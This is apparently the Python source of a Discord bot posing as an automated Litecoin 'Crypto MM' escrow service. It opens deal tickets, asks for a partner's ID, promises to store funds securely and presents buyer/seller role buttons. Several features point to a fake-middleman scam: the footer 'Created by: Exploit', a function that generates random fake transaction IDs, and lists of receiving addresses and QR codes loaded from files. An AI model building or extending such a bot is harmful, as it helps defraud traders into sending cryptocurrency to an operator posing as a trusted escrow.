import discord
from discord.ext import commands
from discord import app_commands, Interaction, Embed, ButtonStyle
from discord.ui import View, Button
import asyncio
import random
import string
import json

# Load config
with open('config.json') as f:
    config = json.load(f)
TOKEN = config['token']
CATEGORY_ID = config['category_id']
GUILD_ID = config['guild_id']

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Load multiple values from files
with open('ltcaddy.txt') as f:
    LTC_ADDRESSES = [line.strip() for line in f if line.strip()]
with open('qr.txt') as f:
    QR_LIST = [line.strip() for line in f if line.strip()]
with open('apikey.txt') as f:
    API_KEYS = [line.strip() for line in f if line.strip()]

# --- Utilities ---
def generate_code():
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=32))

def random_txid():
    return ''.join(random.choices("0123456789abcdef", k=64))

# --- State Tracking ---
sessions = {}

# --- Views ---
class RoleSelectionView(View):
    def __init__(self, channel_id):
        super().__init__(timeout=None)
        self.channel_id = channel_id

        self.add_item(Button(label="Sending Litecoin ( Buyer )", style=ButtonStyle.primary, custom_id="role_buyer"))
        self.add_item(Button(label="Receiving Litecoin ( Seller )", style=ButtonStyle.primary, custom_id="role_seller"))
        self.add_item(Button(label="Reset", style=ButtonStyle.danger, custom_id="reset_roles"))

# --- Main Event Handler ---
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    bot.tree.copy_global_to(guild=discord.Object(id=GUILD_ID))
    await bot.tree.sync(guild=discord.Object(id=GUILD_ID))

@bot.event
async def on_guild_channel_create(channel):
    if channel.category_id != CATEGORY_ID:
        return

    code = generate_code()
    await channel.send(f"`{code}`")
    await asyncio.sleep(1)
    await channel.send("Please send the **Developer ID** of the user you are dealing with.\nsend `cancel` to cancel the deal")

    def check_dev_id(m):
        return m.channel == channel and not m.author.bot

    try:
        reply = await bot.wait_for('message', check=check_dev_id, timeout=300)
        if reply.content.lower() == "cancel":
            return await channel.send("Deal cancelled.")

        dev_id = reply.content.strip()
        try:
            user = await bot.fetch_user(int(dev_id))
        except:
            return await channel.send("Invalid Developer ID.")

        await channel.set_permissions(user, read_messages=True, send_messages=True)
        await channel.send(f"Added <@{reply.author.id}> to the ticket!")

        embed1 = Embed(
            title="Crypto MM",
            description="Welcome to our automated cryptocurrency Middleman system! Your cryptocurrency will be stored securely till the deal is completed. The system ensures the security of both users, by securely storing the funds until the deal is complete and confirmed by both parties.",
            color=0x2b2d31
        )
        embed1.set_footer(text="Created by: Exploit")
        await channel.send(embed=embed1)

        embed2 = Embed(
            title="Please Read!",
            description="Please check deal info , confirm your deal and discuss about tos and warranty of that product. Ensure all conversations related to the deal are done within this ticket. Failure to do so may put you at risk of being scammed.",
            color=0xff0000
        )
        await channel.send(embed=embed2)

        embed3 = Embed(
            title="Role Selection",
            description="Please select one of the following buttons that corresponds to your role in this deal. Once selected, both users must confirm to proceed.\n\nSending Litecoin ( Buyer )\nNone\n\nReceiving Litecoin ( Seller )\nNone",
            color=0x2b2d31
        )
        await channel.send(embed=embed3, view=RoleSelectionView(channel.id))

    except asyncio.TimeoutError:
        await channel.send("Timed out. Deal cancelled.")

# Run Bot
bot.run(TOKEN)
